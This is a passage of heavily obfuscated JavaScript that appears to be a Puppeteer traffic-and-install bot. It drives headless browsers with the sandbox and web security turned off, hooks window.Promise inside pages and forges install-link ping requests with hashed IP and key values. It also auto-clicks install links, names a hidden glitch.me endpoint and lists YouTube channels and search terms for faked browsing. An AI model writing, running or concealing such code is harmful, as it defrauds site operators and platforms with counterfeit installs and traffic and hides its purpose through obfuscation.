                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x2 * -0x91f + 0x454 + 0xb29 * -0x2 ? (this['block'] = P[-0x7ea + 0x898 + -0x9e], this['start'] = N - (-0x2187 + 0x3 * -0xa71 + 0x411a), this['hash'](), this['hashed'] = -0x7f9 + 0x20c + -0xb * -0x8a) : this['start'] = N;
                }
                return this['bytes'] > 0x15f1e6477 + -0x1c02b84b3 + 0x1610d203b && (this['hBytes'] += this['bytes'] / (-0x1aee4ffa4 + -0x35 * -0x60d3cf0 + 0x9a4 * 0x25faf5) << 0x10e1 * -0x1 + 0x2ef * -0x1 + 0x13d0 * 0x1, this['bytes'] = this['bytes'] % (0x1 * 0x1d20d534c + 0x27cfbe8 * -0xc1 + 0x1 * 0x10e2c969c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x5ef + -0x1f53 + 0x2543;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1 * -0x196 + 0x15d8 + 0x3 * -0x7ca] = this['block'], J[K >> 0x1 * -0xc1 + 0x3f5 * -0x2 + -0x1 * -0x8ad] |= x[0x1cbe + 0x1 * 0x1b14 + 0x7f9 * -0x7 & K], this['block'] = J[0x2cf + -0x170b * -0x1 + -0x19ca], K >= 0x49f * 0x1 + -0x2212 + 0x1dab && (this['hashed'] || this['hash'](), J[0x2aa * -0x1 + 0x1657 + -0x17 * 0xdb] = this['block'], J[0x3 * -0xb0c + 0x1 * 0x2c3 + 0x1 * 0x1e71] = J[-0x211 + 0x25a5 + -0x2393] = J[0x3 * 0x1d + 0x34 * -0xa9 + 0x3c7 * 0x9] = J[-0x8a5 + -0x26b7 + 0x2f5f] = J[-0x2 * -0x863 + -0x269d + 0x15db] = J[0xa6c + -0x3 * 0xc9c + -0x11 * -0x19d] = J[-0x2cb * 0xd + 0x1 * -0x922 + 0x67 * 0x71] = J[0x1d * -0x6f + 0x2197 + -0x14fd] = J[-0x2cb * 0xb + -0x12ac + 0x316d] = J[0xa48 + -0x22 * -0x87 + -0x1c2d] = J[0x26b1 + -0x1 * 0x1ba6 + -0xb01] = J[-0xe * 0x1c9 + -0xc04 + 0x250d] = J[-0x20b6 + 0x23b9 + -0x2f7] = J[0x1489 + -0x3 * 0x9d7 + 0x909 * 0x1] = J[0x1 * 0x200b + 0x1393 * -0x1 + -0xc6a] = J[-0x1 * -0x522 + 0xe45 * 0x2 + -0x219d] = -0x11ef * -0x2 + -0x21e2 + -0x1fc), J[-0x1 * 0x48f + 0xc51 + -0x44 * 0x1d] = this['hBytes'] << -0x1575 + -0x2 * 0xb4e + -0x7 * -0x64c | this['bytes'] >>> -0xcdc * -0x3 + 0x193 * -0x2 + 0x2351 * -0x1, J[0x11fa + 0x3 * -0x1fd + 0x5 * -0x264] = this['bytes'] << 0x665 * -0x1 + 0x36d * -0xb + -0x2c17 * -0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x19f4 + 0x1bf0 + -0x1ec; J < -0x1d * 0x87 + -0x8f5 * 0x4 + 0x336f; ++J)
                K = Q[J - (-0x1 * -0x1393 + -0x2b1 * 0x5 + 0x1 * -0x61b)] ^ Q[J - (0x1b6d * 0x1 + 0x2 * 0x11b + -0x1d9b)] ^ Q[J - (-0x1288 + -0x2 * 0x1ba + 0xb05 * 0x2)] ^ Q[J - (-0x2c9 * 0x6 + 0x13e6 + -0x320)], Q[J] = K << 0x7f * 0x18 + 0x249f + 0x1 * -0x3086 | K >>> -0x2686 + 0x1d * -0x59 + 0x9 * 0x56a;
              for (J = -0x427 * -0x8 + -0x8b0 + -0x1888; J < 0x2 * -0xd0f + 0x2316 + -0x8e4; J += -0x25ee + -0x161b * 0x1 + 0x3c0e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x853 + -0x10ce + 0x880 | L >>> -0x18e + -0x1fa6 + -0x1 * -0x214f) + (M & N | ~M & O) + P + (-0x201085cb + -0x26638df * 0x2f + 0x9 * 0x1a2628ed) + Q[J] << -0x206 * 0xd + 0x1 * -0x1c51 + 0x4f * 0xb1) << -0x1b * 0x7b + 0x2dc + 0x511 * 0x2 | P >>> -0xe09 + 0x2ad * 0xa + 0x286 * -0x5) + (L & (M = M << -0x33 * -0xc1 + 0xda0 + -0x33f5 | M >>> 0x929 + 0x1 * 0x7c3 + -0x10ea) | ~L & N) + O + (-0x2 * -0x52324b82 + 0x80268231 + -0x3 * 0x43583534) + Q[J + (-0x4 * -0x3e7 + 0x3b * 0x1e + -0x1 * 0x1685)] << -0x2de + 0x24 * 0x30 + -0x3e2) << -0x175a + -0x1 * 0x1273 + -0x6a * -0x65 | O >>> -0xe * -0x2e + 0xdd3 + -0x103c) + (P & (L = L << -0x1 * -0x12db + 0x9a5 + -0x1c62 * 0x1 | L >>> -0xed0 + 0xc0c + -0x8e * -0x5) | ~P & M) + N + (-0x2c82107 + 0xb80466d + 0x51ca5433) + Q[J + (0x16 * 0xd3 + -0x671 + -0xbaf)] << 0x2c6 + 0x1 * -0x1fed + 0x1d27) << -0xb23 + -0x1 * -0xff9 + -0x4d1 | N >>> -0x10b2 + 0x1 * 0x19db + -0x13 * 0x7a) + (O & (P = P << 0x72f + -0x2242 + -0x1 * -0x1b31 | P >>> -0x1 * -0x83 + -0x259c + 0x251b) | ~O & L) + M + (0x297916 * 0x2f + -0x5dec3d6c + 0x509 * 0x231de3) + Q[J + (-0x1 * -0xd80 + -0x15e7 + 0x86a)] << -0x2 * -0x617 + -0xe58 + 0x22a) << -0x10 * -0x5f + 0x102d * 0x1 + -0x1618 | M >>> 0x39 * -0xb + 0x1 * -0xc75 + 0x3 * 0x501) + (N & (O = O << -0x47f + -0x11cc + 0x1669 | O >>> -0xb71 + 0x262c + -0x1ab9) | ~N & P) + L + (-0x262551ad + 0x34de794f + -0x34b8921 * -0x17) + Q[J + (0x1d1 * 0x1 + -0x1145 + -0x5 * -0x318)] << -0x1 * -0x1dba + 0x486 + -0x2240, N = N << 0x1 * -0x7eb + 0x2a5 + -0xc * -0x73 | N >>> -0x4b5 * -0x2 + -0x3 * -0xaec + 0x2 * -0x1516;
              for (; J < -0x1 * -0xc11 + 0x1fa4 + -0x2b8d; J += -0xccb + -0x359 * -0x5 + -0x3ed)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x30a * 0x1 + 0x1245 + -0x6d * 0x32 | L >>> 0x7 * 0x321 + -0x4 * 0x59e + 0xac) + (M ^ N ^ O) + P + (-0x2e0e141 * -0x1f + -0xd366a5eb + 0x9f1 * 0x17707d) + Q[J] << 0xb5e + -0x218 * 0xb + 0xbaa * 0x1) << -0x2f * -0xc9 + -0x1 * -0x9db + -0x2ebd | P >>> -0x13b3 + -0x73 * -0x11 + -0x5 * -0x26f) + (L ^ (M = M << 0x23b6 + -0x1e1 * -0x2 + -0x2 * 0x13ad | M >>> 0x1bc7 + 0x7ef * 0x2 + 0x1 * -0x2ba3) ^ N) + O + (-0xd03f45d9 + -0x42 * -0x309f009 + -0x37c8254 * -0x22) + Q[J + (-0x929 * 0x2 + 0x1c67 + -0xa14 * 0x1)] << -0xa02 + -0x1 * 0x20b + -0xc0d * -0x1) << -0x4 * -0x70a + -0x1794 + -0x185 * 0x3 | O >>> 0xbaf + -0x5b3 * 0x4 + -0xb38 * -0x1) + (P ^ (L = L << 0xf10 + 0x4 * 0x18e + -0x152a | L >>> -0x1f7a + 0x9d * 0x1f + 0xc79) ^ M) + N + (-0x7c6a29aa + 0x3a7b88b0 + -0x8b * -0x1459631) + Q[J + (-0x1 * 0x1ae3 + 0x28 * -0xcd + 0x7 * 0x86b)] << 0x15e + -0x290 + 0x132) << 0x16da + 0x26b * 0x1 + -0x1940 | N >>> 0x14d4 + 0xfaa + -0x2463) + (O ^ (P = P << 0x49 * -0x1a + -0x63 * 0x15 + -0xfa7 * -0x1 | P >>> 0x952 + -0x1 * 0xcee + 0x39e) ^ L) + M + (0xb986ef8a + 0x57d49225 + -0xa281960e) + Q[J + (0xdf5 + -0xccf + -0x1 * 0x123)] << 0xe6d + -0xb5 * 0x36 + -0x17c1 * -0x1) << 0x1aeb + 0x1421 * -0x1 + -0x6c5 | M >>> -0x808 + 0x74e + 0xd5) + (N ^ (O = O << 0x1c * 0xf + 0x487 * -0x6 + 0x19a4 | O >>> 0x9 * 0x24b + 0x3e5 * 0x1 + -0x1886) ^ P) + L + (-0x115575da + 0x5d663e * -0x8f + 0xb45b7e1d) + Q[J + (-0xab9 + -0x1e8b + 0x2948)] << -0x3b * -0x2 + 0x1a95 * -0x1 + 0x1a1f, N = N << -0x11c6 + 0x8e8 + 0x8fc | N >>> 0x1b74 + -0x1 * -0x757 + -0x6f5 * 0x5;
              for (; J < -0x65 * 0xe + 0x9 * 0x183 + -0x7d9; J += 0x1 * -0x13b8 + 0xc8f + -0x397 * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x78d * 0x4 + -0x3f1 * -0x3 + -0x1 * 0x2a02 | L >>> 0xb * -0x32f + -0x1 * 0x2462 + 0x153 * 0x36) + (M & N | M & O | N & O) + P - (-0x6ace9e1b + 0x32f5 * -0x39101 + -0x1e * -0xd618fc6) + Q[J] << -0x92e + -0x46d * 0x8 + 0x2c96) << 0xb * 0x1bb + -0x2 * -0xecb + -0x309a | P >>> 0x2 * 0xd3a + -0x137a * 0x2 + 0xc9b) + (L & (M = M << -0x6d6 + -0x8 * 0x3d7 + 0x12d6 * 0x2 | M >>> 0x435 * -0x6 + 0x37c + 0x1 * 0x15c4) | L & N | M & N) + O - (-0x1201 * 0xc5ff2 + -0x31426c1c + 0x180f21332) + Q[J + (-0x70b * 0x1 + 0x6fd * 0x1 + 0x3 * 0x5)] << 0x17b6 + 0x1 * 0xcfb + -0x24b1) << 0x838 + 0x625 * 0x3 + 0x3ce * -0x7 | O >>> -0x66d + 0x6d * -0x2e + -0x1a1e * -0x1) + (P & (L = L << 0x1b4f + 0x1 * 0x13bd + 0x2eee * -0x1 | L >>> 0x8d * 0x2f + -0x188f * -0x1 + -0x3270) | P & M | L & M) + N - (0xcd28fd58 + -0x3c9d7 * 0x2776 + 0x393a0fe6) + Q[J + (-0xc8f * 0x3 + -0x198 + 0x2747)] << 0x1aec + -0x10ec + -0xa00) << 0x8 * -0x3e5 + -0x1cc1 + 0x3bee * 0x1 | N >>> 0x2 * 0xd31 + 0x77 * -0x26 + -0x89d) + (O & (P = P << -0x135c + 0x2 * 0x2e8 + 0xdaa | P >>> -0x1 * 0x2069 + -0x2fe + 0x2369) | O & L | P & L) + M - (-0x71808aa1 + 0x1 * 0x542772d3 + 0x226 * 0x4234c3) + Q[J + (0x1 * 0x1885 + 0x655 * -0x4 + 0xd2)] << 0x3 * 0x407 + -0x8b * 0x23 + -0x1 * -0x6ec) << 0x1600 + 0x1517 + -0x25 * 0x12a | M >>> 0xcdd + 0x1 * -0x170b + 0xa49) + (N & (O = O << 0x1869 + 0xa20 + -0x226b | O >>> 0x2 * -0x19d + -0x1 * 0x1a8f + -0x1dcb * -0x1) | N & P | O & P) + L - (-0x6c91b03 * 0x1 + 0x428fe632 + 0x351d77f5) + Q[J + (0xb8c * 0x3 + 0x1 * 0xb37 + -0x92b * 0x5)] << -0x21e7 + 0x1 * 0x22e9 + 0x2b * -0x6, N = N << 0x7c + -0x1cbb * 0x1 + 0x35 * 0x89 | N >>> -0x59 * 0x19 + -0x221e * 0x1 + 0x2ad1;
              for (; J < -0x1 * -0x1e1d + 0xb * -0x1b1 + -0x599 * 0x2; J += -0xa6 * 0x2d + 0x1 * -0x1a37 + 0x376a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x3 * 0x245 + -0x1 * 0x749 + 0x7f * 0x1 | L >>> -0x1 * 0x2291 + -0x83 * -0x11 + 0x19f9) + (M ^ N ^ O) + P - (0x1 * 0x2f7649f + -0x6a07b30c + 0x9cad8c97) + Q[J] << -0x5 * 0x1f3 + -0x5b2 * 0x2 + 0x7 * 0x305) << -0x238e + -0x7ae + 0x2b41 | P >>> 0x1217 + 0x1 * 0xe91 + -0x208d) + (L ^ (M = M << 0x1823 + 0x191 + 0x1996 * -0x1 | M >>> -0x224d * -0x1 + 0x27c * 0xe + -0x4513) ^ N) + O - (0x51b6530b * -0x1 + -0xe80b * -0x674 + -0x19e53ba5 * -0x5) + Q[J + (0xec * -0xf + -0xa16 + 0x17eb)] << -0x13fb + -0x1e1b + -0x2 * -0x190b) << 0x1 * 0x602 + -0x35 * 0xb + 0x5 * -0xbe | O >>> 0x98f + -0x23e6 + 0xa * 0x2a5) + (P ^ (L = L << -0x1 * -0xdfb + -0x239f + 0x1 * 0x15c2 | L >>> 0x7 * -0x51b + -0x918 + -0x1 * -0x2cd7) ^ M) + N - (0x1c7172ac + 0x26ee084 + -0x1 * -0x16bceafa) + Q[J + (0xf55 + -0x1 * 0xe5a + -0x3 * 0x53)] << 0x1 * -0x38f + 0x228b + 0x52a * -0x6) << -0x9d4 + 0x9b4 + 0x25 | N >>> 0x1478 + 0x10f + -0x156c) + (O ^ (P = P << 0x1f49 * -0x1 + 0xe * -0x7b + -0x1 * -0x2621 | P >>> 0x43f * -0x3 + -0xc * -0xb2 + 0x467) ^ L) + M - (0x2 * 0x1fc167d3 + 0x4f3333b + -0x9 * 0x1a64ebf) + Q[J + (-0xa58 + 0x1 * 0x181 + -0x2 * -0x46d)] << 0x1d89 * 0x1 + -0x21b7 * 0x1 + 0x42e) << 0x2 * -0xa65 + 0x3a * -0x86 + 0x332b | M >>> 0x5b5 + 0x16ca * -0x1 + 0x1130) + (N ^ (O = O << 0x14 * -0x6b + -0xbbe + 0x1438 | O >>> -0x2476 * -0x1 + -0x2281 + -0x1f3) ^ P) + L - (-0x52 * -0x10b00b3 + -0x41e80b57 + -0x1 * -0x21ff102b) + Q[J + (-0x2438 + 0x1 * -0xf9f + 0xb1 * 0x4b)] << 0x1b5 * -0x16 + 0x35 * 0x29 + -0x1d11 * -0x1, N = N << -0x1f58 + 0x25 * 0x71 + 0xf21 | N >>> 0x36 + -0xf02 + 0xece;
              this['h0'] = this['h0'] + L << -0xca * -0x25 + 0x4b9 + -0x21eb * 0x1, this['h1'] = this['h1'] + M << 0x1db0 + 0xb1e + -0x28ce, this['h2'] = this['h2'] + N << 0x1 * 0x175d + -0x384 + -0x1 * 0x13d9, this['h3'] = this['h3'] + O << -0x8 * -0x4c7 + 0x3 * 0x69d + -0x3a0f, this['h4'] = this['h4'] + P << -0x2579 + 0x13 * 0x175 + 0x9ca;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1e50 + -0xc17 + -0x121d * 0x1 & 0x15d * 0x1 + 0x364 + -0x4b2] + w[J >> 0x1c7d + -0x29b + -0x19ca & -0x270d * 0x1 + -0xf * -0x8a + 0xb * 0x2d2] + w[J >> 0x3d5 + -0xa5 * 0x33 + 0x1d1e * 0x1 & 0xd66 * -0x1 + 0x2139 + -0x13c4] + w[J >> 0x2f * 0x93 + -0x1de2 + 0x2f5 & 0x49d * 0x7 + 0x1 * -0x170b + -0xb5 * 0xd] + w[J >> 0x2ae * -0x1 + -0x25ea + -0x12 * -0x242 & 0x27 * -0x1b + -0x291 + 0x73 * 0xf] + w[J >> -0x41f * -0x2 + 0x25fb + -0x2e31 & 0x2129 * 0x1 + -0x7c4 * -0x2 + -0x30a2] + w[J >> -0xc30 + 0x35f * -0x3 + 0x1651 * 0x1 & 0x11cd + 0x20ab * -0x1 + -0xeed * -0x1] + w[0x5b9 + 0x4df + -0xa89 & J] + w[K >> -0x1 * -0x1106 + 0x1c09 * 0x1 + 0x137 * -0x25 & 0x1 * 0x19ef + -0x3 * 0x9db + -0x1 * -0x3b1] + w[K >> 0x4d * -0x29 + 0x1cda * 0x1 + 0x106d * -0x1 & -0x1 * 0x52f + -0xe82 + 0x9e * 0x20] + w[K >> 0x170f + 0x11de + 0x1 * -0x28d9 & 0xdeb + -0x28d * 0x4 + -0x3a8] + w[K >> -0x2be * -0x1 + 0x465 * -0x2 + 0x61c & -0x6a1 * -0x1 + 0x1bc6 + -0x1c * 0x13a] + w[K >> -0x21da + -0x73 * -0x5 + 0x1fa7 & -0xf * 0x25f + 0x526 + 0x1e7a] + w[K >> -0xdbe * -0x2 + 0x2f * 0xb5 + 0xc23 * -0x5 & -0x2149 + 0x1 * 0x17b7 + 0x9a1] + w[K >> -0x12f9 + 0x1 * 0x1e88 + -0xb8b & -0x16f2 + -0xc88 + 0xb * 0x33b] + w[0x19 * -0xb0 + 0x707 + 0x18 * 0x6d & K] + w[L >> 0xc1 * 0x1a + 0x233b + -0x36b9 & 0x10a3 + 0xd7e + 0x503 * -0x6] + w[L >> 0xc3f + -0x1 * -0x1d43 + -0x296a & 0x1cc * -0x5 + -0x1a66 + -0x1 * -0x2371] + w[L >> -0x23a2 * 0x1 + 0x118 + 0x5c5 * 0x6 & -0x93e + 0x1 * -0x1b09 + 0x2456] + w[L >> -0x7 * 0x202 + 0x1 * 0x251 + 0xbcd & 0x9 * -0x4e + 0x15b6 + -0x2f * 0x67] + w[L >> 0x5ee + -0x4fe * -0x1 + -0x15c * 0x8 & 0x2147 * 0x1 + 0x13e0 + -0x3518] + w[L >> 0x19 * -0x10d + -0x17 * -0x9 + -0xd * -0x1f6 & 0x40 * -0x3b + -0x607 * 0x1 + -0xe * -0x17d] + w[L >> 0x20 * -0x123 + 0x81e * -0x2 + 0x34a0 & -0x1b9d * 0x1 + -0x146d + -0x1 * -0x3019] + w[-0x1 * -0x967 + -0x10f * -0xd + -0x171b & L] + w[M >> 0x1 * 0x25d3 + 0xc5 * -0x4 + -0x22a3 * 0x1 & 0x3 * 0x3df + -0x1085 * 0x2 + 0x157c] + w[M >> 0xc * 0xd + -0x117e + 0x10fa & 0xec5 * 0x1 + -0x3 * 0x9aa + 0xe48] + w[M >> -0x2128 + -0x228e + -0x1 * -0x43ca & -0x2bd * 0x1 + -0x8 * 0x12e + 0xc3c * 0x1] + w[M >> -0x2e5 + -0x355 * -0x7 + -0x9e * 0x21 & -0x118 * -0xe + 0x2d2 + -0x1213] + w[M >> 0x69d * -0x1 + -0xcf9 + 0x2 * 0x9d1 & 0xd5c + -0x41e + -0x92f * 0x1] + w[M >> 0x1d57 * -0x1 + -0x1617 + 0x3376 & 0x1b11 + 0x13 * -0x1f0 + -0x4e7 * -0x2] + w[M >> -0x3 * -0x19f + 0xb8d * 0x1 + -0x1066 & 0x4 * 0x32 + -0xae4 + -0x89 * -0x13] + w[0x1ffc + 0x39 * -0xa7 + 0x542 & M] + w[N >> 0xb25 + 0x1d4d + -0x2856 & -0xabd * -0x1 + 0x224d * 0x1 + -0x2cfb] + w[N >> 0xd69 * -0x1 + -0x10b8 + -0xa13 * -0x3 & -0x1 * 0x2599 + 0x1f06 + 0x6a2] + w[N >> -0x36 * -0x26 + 0x5f0 + -0xde0 * 0x1 & -0x78f + -0x1d4f + -0x1 * -0x24ed] + w[N >> 0x1daf + -0x10e8 + 0x23 * -0x5d & -0x25aa + -0xb38 + 0x30f1] + w[N >> -0x1358 + 0x11 * -0xcd + 0x2101 * 0x1 & 0x20ab + -0x3bc + 0x58 * -0x54] + w[N >> -0x1cf5 * -0x1 + 0x1f3 * -0xc + -0x589 & 0x1b * -0x7c + -0x11d6 + 0x1ef9] + w[N >> -0x161 + -0x7 * 0x3d + 0x310 & -0x1d2b + -0x2 * -0xc2c + 0x2 * 0x271] + w[0x23d2 + -0x1 * -0x1844 + 0xb * -0x575 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xbdc + -0x279 * 0x7 + 0x1d43 & 0xbc * 0x15 + 0x6d * 0x10 + -0x153d * 0x1,
                J >> -0x2173 + 0x1 * 0x5c9 + 0x93e * 0x3 & 0x1dc5 + 0x236f + -0x1 * 0x4035,
                J >> -0x735 + 0x10 * 0x129 + 0xdf * -0xd & -0x30 * -0xbd + -0x9 * 0x1b1 + -0x1338,
                0x10ee + -0xcf1 + -0x2fe & J,
                K >> 0x74b + 0x2676 * -0x1 + -0x35 * -0x97 & -0x60 + 0x6f9 + -0x59a * 0x1,
                K >> 0x1f06 + -0x263d + 0x747 & -0x1093 + -0x1 * 0x11a0 + 0x2332,
                K >> -0x9f1 + 0x1b8 + 0x841 * 0x1 & -0x26d6 + 0xd5c + 0x8d3 * 0x3,
                0x1021 + -0x246d * -0x1 + -0x338f & K,
                L >> -0x1692 + -0x1 * -0x2125 + -0xa7b & 0x16f7 * 0x1 + 0x1 * -0xd60 + -0x898,
                L >> 0x523 + 0x3 * -0xa06 + 0x18ff & 0xd * -0xe7 + 0x1637 + 0x7 * -0x15b,
                L >> -0x2698 + 0x1 * 0x121d + 0x3b * 0x59 & -0x4 * -0x63a + 0x3a8 + -0x1b91 * 0x1,
                -0x378 * -0x2 + -0x1e61 + 0x1870 & L,
                M >> -0x2f * 0xc2 + 0x13fc + 0xfba & 0xca0 + -0x19b3 * 0x1 + 0x2 * 0x709,
                M >> 0xc5 * -0x17 + -0x16e7 + -0x2 * -0x1455 & -0x1 * 0x1bca + 0x327 * -0xc + 0x429d,
                M >> 0x5 * -0x4b5 + 0x5 * -0x201 + 0x2196 * 0x1 & 0x1 * 0x1ec5 + -0x2f * -0x1f + -0x511 * 0x7,
                0x2081 * 0x1 + -0x1 * 0x13c9 + -0xbb9 & M,
                N >> 0x223a * -0x1 + -0x20fb + 0x166f * 0x3 & -0x1cd3 + -0x14e6 + 0x874 * 0x6,
                N >> 0x39 * 0x12 + 0x724 * -0x5 + 0x5 * 0x65a & 0x1 * 0x2096 + -0x11 * 0x3 + -0x1f64,
                N >> -0x4a4 + 0x665 + 0x9 * -0x31 & -0x231c + -0x5 * -0x380 + 0x129b,
                0x22da + -0x10ea + -0x10f1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1d8a + -0xa9d + 0xc1 * -0x19), (K = new DataView(J))['setUint32'](-0x1 * 0x1e43 + 0x1fa7 + -0x164 * 0x1, this['h0']), K['setUint32'](0x2bf * -0xc + -0x253c + 0x118d * 0x4, this['h1']), K['setUint32'](-0x122b * 0x2 + -0x73a + 0x2b98 * 0x1, this['h2']), K['setUint32'](-0x1489 + -0x7bf + 0x1c54, this['h3']), K['setUint32'](-0x194a * -0x1 + 0x1f47 + -0x3881, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0xd0e + 0x9e1 + 0x32d];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x409 * 0x7 + 0xa5 + -0xe72 * 0x2;
            J[0x200b + 0x1287 + 0x1949 * -0x2]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x5e4 + 0xdbf * 0x2 + -0x2162] = L => {
              const Y = d,
                X = c;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I[X(0x15) + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * -0x96b + -0x10f * -0x3 + 0x125 * -0xb), O['overrideMi' + Y(0x0)]('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1 * 0x133 + -0x169a + 0x1568;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x531 * 0x7 + -0x122 + 0x2b55), Promise['resolve'](0x40d * 0x1 + -0x1c * 0x112 + -0x4 * -0x67b);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1 * 0x247d + -0x83 * 0x4 + -0x2271; j < -0x15bb + 0x28b + 0x1331; j++)
    i();
}
const NETWORK_PATIENCE = 0x922 + -0x1073 + 0x2691 + (-0x14a + 0x12a8 + 0xf1 * -0x6) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x24ec + -0xdea + 0x349 * -0x7) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x50b * 0x5 + -0xca2 + -0xc95);
    let h = e[f];
    return h;
  }, d(b, c);
}
let PROCESSED_XURL_VAL = 'https://co' + Z(0x4) + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + Z(0x5),
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xfad + 0x1365 + -0x2312; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + a0(0x19, 'F1d$') + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + a1(0x8) + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')[a0(0x21, 'ZBjt')](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' 